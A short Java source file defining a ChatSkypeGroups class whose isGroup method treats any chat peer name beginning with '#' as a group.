package com.android.deviceinfo.module.chat;

public class ChatSkypeGroups extends ChatGroups {

	@Override
	boolean isGroup(String peer) {
		
		return peer.startsWith("#");
	}

}
